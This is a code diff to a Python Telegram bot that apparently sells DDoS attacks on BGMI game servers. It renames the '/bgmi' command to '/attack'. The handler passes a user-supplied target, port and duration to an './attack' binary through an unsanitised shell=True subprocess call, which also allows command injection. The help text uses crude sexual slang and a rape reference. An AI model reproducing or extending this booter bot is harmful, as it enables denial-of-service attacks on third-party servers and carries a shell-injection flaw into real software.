@@ -148,7 +148,7 @@ def redeem_key_command(message):
 
     bot.reply_to(message, response)
 
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['attack'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     
@@ -189,10 +189,10 @@ def handle_bgmi(message):
                 if time > 9999:
                     response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙐𝙨𝙚 𝙡𝙚𝙨𝙨𝙩𝙝𝙚𝙣 9999 𝙎𝙚𝙘𝙤𝙣𝙙𝙨."
                 else: 
-                    record_command_logs(user_id, '/bgmi', target, port, time)
+                    record_command_logs(user_id, '/attack', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
-                    full_command = f"./bgmi {target} {port} {time} 500"
+                    full_command = f"./attack {target} {port} {time} 500"
                     subprocess.run(full_command, shell=True)
                     response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🔥"
             except ValueError:
@@ -281,10 +281,10 @@ def show_command_logs(message):
 
     bot.reply_to(message, response)
 
-@bot.message_handler(commands=['helppp'])
+@bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''𝐌𝐄𝐑𝐀 𝐋𝐀𝐍𝐃 𝐊𝐀𝐑𝐄 𝐇𝐄𝐋𝐏 𝐓𝐄𝐑𝐈 𝐋𝐄 𝐅𝐈𝐑 𝐁𝐇𝐈 𝐁𝐀𝐓𝐀 𝐃𝐄𝐓𝐀:
-💥 /bgmi 𝐁𝐆𝐌𝐈 𝐊𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐘𝐈.
+💥 /attack 𝐁𝐆𝐌𝐈 𝐊𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐘𝐈.
 💥 /rules: 𝐅𝐨𝐥𝐥𝐨𝐰 𝐞𝐥𝐬𝐞 𝐑𝐚𝐩𝐞.
 💥 /mylogs: 𝐀𝐏𝐊𝐄 𝐏𝐎𝐎𝐑𝐀𝐍𝐄 𝐊𝐀𝐀𝐑𝐍𝐀𝐌𝐄 𝐉𝐀𝐍𝐍𝐄 𝐊 𝐋𝐈𝐘𝐄.
 💥 /plan: 𝐉𝐢𝐧𝐝𝐠𝐢 𝐦𝐞 𝐊𝐨𝐞 𝐏𝐋𝐀𝐍 𝐧𝐚𝐡𝐢 𝐡𝐨𝐧𝐚 𝐂𝐡𝐚𝐡𝐢𝐲𝐞.
